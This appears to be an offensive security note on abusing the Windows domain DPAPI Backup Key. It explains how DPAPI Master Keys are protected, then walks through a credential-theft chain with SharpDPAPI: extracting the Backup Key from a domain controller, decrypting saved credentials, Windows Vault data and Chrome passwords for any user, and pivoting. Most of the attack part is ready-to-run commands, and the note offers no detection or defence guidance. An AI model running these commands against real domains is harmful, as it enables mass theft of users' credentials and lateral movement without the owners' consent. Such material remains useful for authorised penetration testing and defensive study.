DPAPI protects a user's secrets (saved passwords, RDP creds, browser data, Wi-Fi material, and more) by using a Master Key generated on that machine. That Master Key is encrypted with material derived from the user's password, which means, in theory, only that user should be able to decrypt those secrets. In a domain, however, DPAPI behaves differently: Windows automatically creates a **domain Backup Key** and stores a recovery copy of each user's Master Key encrypted with that Backup Key. Anyone who obtains the Backup Key can decrypt the Master Keys of any user in the domain without knowing their passwords.

- **DPAPI**: system that protects the Master Key with material derived from the user's password.
- **Master Key**: random AES key that actually encrypts the user's DPAPI secrets.
- **Domain Backup Key**: secret stored in Active Directory and used to generate recovery copies of user Master Keys.
  - It is created when the domain is created.
  - It does not rotate automatically.
  - If an attacker gets it, every user in the domain is at risk.

- [ ] Impact

Anyone with the domain Backup Key can decrypt the DPAPI secrets of every user in the domain, persistently, for as long as that Backup Key remains valid. One key breaks the isolation of **all** users.

- Decrypt saved credentials
- Recover RDP, Wi-Fi, and browser passwords
- Recover secrets without knowing user passwords

- [ ] Requirements

- Be Domain Admin / Enterprise Admin or control a DC
- Run SharpDPAPI from a domain-joined host
- Hold a privileged context (high-integrity token)

- [ ] Flow

```text
Obtain the domain Backup Key
↓
Locate user DPAPI blobs
↓
Use the Backup Key to decrypt Master Keys
↓
Decrypt the underlying secrets
↓
Pivot / lateral movement
```

> The DPAPI Backup Key is a “burn the forest” primitive.

1. Extract the DPAPI Backup Key

```powershell
.\SharpDPAPI.exe backupkey
# [*] Key : HvG1s[...snip...]lXQns=
```

- Queries the DC over RPC
- Recovers the domain recovery private key

> This is the key that can decrypt the Master Keys of **all** users.

2. Decrypt DPAPI Secrets

```powershell
.\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
```

- `credentials` enumerates and decrypts DPAPI blobs under `%LocalAppData%\Microsoft\Credentials\`.
- `/pvk:` tells SharpDPAPI to use the domain Backup Key instead of trying the local Master Key.
- This allows decryption of DPAPI secrets regardless of the user's password.

> When running `.\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=` without specifying the `/target` parameter, the tool operates by default in the context of the current user. This means it will attempt to locate and decrypt DPAPI blobs stored in the user’s profile paths (for example, `%LocalAppData%\Microsoft\Credentials`), using the domain Backup Key to derive the corresponding Master Key and recover the secrets associated with that user.

- [ ] Decrypt Secrets for Other Users

```powershell
# Saved credentials for a specific user
.\SharpDPAPI.exe credentials /pvk:KEY /target:C:\Users\ada\

# Another user's profile
.\SharpDPAPI.exe credentials /pvk:KEY /target:C:\Users\john\

# All users on the host
.\SharpDPAPI.exe credentials /pvk:KEY /target:C:\Users\

# Windows Vault material
.\SharpDPAPI.exe vaults /pvk:KEY /target:C:\Users\ada\

# Browser credentials (for example Chrome)
.\SharpDPAPI.exe chrome /pvk:KEY /target:C:\Users\ada\
```
